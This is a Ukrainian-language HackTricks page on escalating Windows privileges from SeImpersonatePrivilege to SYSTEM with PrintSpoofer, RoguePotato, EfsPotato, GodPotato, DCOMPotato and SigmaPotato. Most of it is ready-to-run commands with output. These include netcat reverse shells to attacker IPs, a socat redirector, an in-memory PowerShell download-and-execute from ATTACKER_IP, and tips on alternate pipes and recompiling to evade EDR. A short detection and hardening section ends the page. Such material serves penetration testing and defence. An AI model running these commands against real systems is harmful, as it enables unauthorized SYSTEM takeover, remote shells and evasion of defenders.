# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato не працює** на Windows Server 2019 та Windows 10 build 1809 і новіших версіях. Однак [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** можуть бути використані, щоб **отримати ті ж привілеї та доступ рівня `NT AUTHORITY\SYSTEM`**. This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) детально розглядає інструмент `PrintSpoofer`, який можна використовувати для зловживання правами імперсонації на хостах Windows 10 та Server 2019, де JuicyPotato більше не працює.

> [!TIP]
> Сучасною альтернативою, яка часто підтримується в 2024–2025 роках, є SigmaPotato (форк GodPotato), який додає використання in-memory/.NET reflection та розширену підтримку ОС. Дивіться швидке використання нижче та репозиторій у References.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Вимоги та поширені підводні камені

Усі наведені нижче техніки засновані на зловживанні службою з привілеями, що дозволяє імперсонацію, з контексту, який має одну з наступних привілеїв:

- SeImpersonatePrivilege (найчастіше) або SeAssignPrimaryTokenPrivilege
- High integrity не потрібен, якщо токен вже має SeImpersonatePrivilege (типово для багатьох облікових записів служб, таких як IIS AppPool, MSSQL тощо)

Швидко перевірте привілеї:
```cmd
whoami /priv | findstr /i impersonate
```
Операційні нотатки:

- PrintSpoofer потребує, щоб сервіс Print Spooler був запущений і доступний через локальний RPC-ендпоінт (spoolss). В ускладнених середовищах, де Spooler вимкнено після PrintNightmare, надавайте перевагу RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato вимагає OXID resolver, доступний по TCP/135. Якщо вихідний трафік заблокований, використовуйте redirector/port-forwarder (див. приклад нижче). Старіші збірки потребували прапора -f.
- EfsPotato/SharpEfsPotato зловживають MS-EFSR; якщо один pipe заблоковано, спробуйте альтернативні pipe (lsarpc, efsrpc, samr, lsass, netlogon).
- Помилка 0x6d3 під час RpcBindingSetAuthInfo зазвичай означає невідомий/непідтримуваний RPC authentication service; спробуйте інший pipe/transport або переконайтесь, що цільовий сервіс запущений.

## Швидка демонстрація

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Примітки:
- Ви можете використовувати -i, щоб запустити інтерактивний процес у поточній консолі, або -c для виконання one-liner.
- Потребує служби Spooler. Якщо вона вимкнена, це не вдасться.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Якщо вихідний порт 135 заблоковано, pivot OXID resolver через socat на вашому redirector:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Порада: Якщо один pipe не працює або EDR його блокує, спробуйте інші підтримувані pipes:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Примітки:
- Працює на Windows 8/8.1–11 та Server 2012–2022 за наявності SeImpersonatePrivilege.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato надає два варіанти, що націлені на service DCOM objects, які за замовчуванням мають RPC_C_IMP_LEVEL_IMPERSONATE. Скомпілюйте або використайте надані binaries і запустіть вашу команду:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (оновлений форк GodPotato)

SigmaPotato додає сучасні зручності, як-от in-memory execution через .NET reflection і PowerShell reverse shell helper.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
## Примітки щодо виявлення та посилення захисту

- Моніторте процеси, що створюють named pipes і одразу викликають API для дублювання токенів, а потім CreateProcessAsUser/CreateProcessWithTokenW. Sysmon може надати корисну телеметрію: Event ID 1 (створення процесу), 17/18 (named pipe створено/підключено) та командні рядки, що порождають дочірні процеси як SYSTEM.
- Посилення захисту Spooler: Вимкнення служби Print Spooler на серверах, де вона не потрібна, запобігає локальним зловживанням у стилі PrintSpoofer через spoolss.
- Посилення безпеки облікових записів сервісів: мінімізуйте призначення SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege для кастомних сервісів. Розгляньте запуск сервісів під virtual accounts з мінімально необхідними правами та ізоляцію за допомогою service SID і write-restricted tokens, коли це можливо.
- Мережеві контролі: Блокування вихідного TCP/135 або обмеження трафіку RPC endpoint mapper може зламати RoguePotato, якщо не доступний internal redirector.
- EDR/AV: Усі ці інструменти широко сигнатуровані. Перекомпіляція з вихідників, перейменування символів/рядків або виконання в пам'яті може зменшити виявлення, але не подолає надійні поведінкові детекції.

## Посилання

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)

{{#include ../../banners/hacktricks-training.md}}
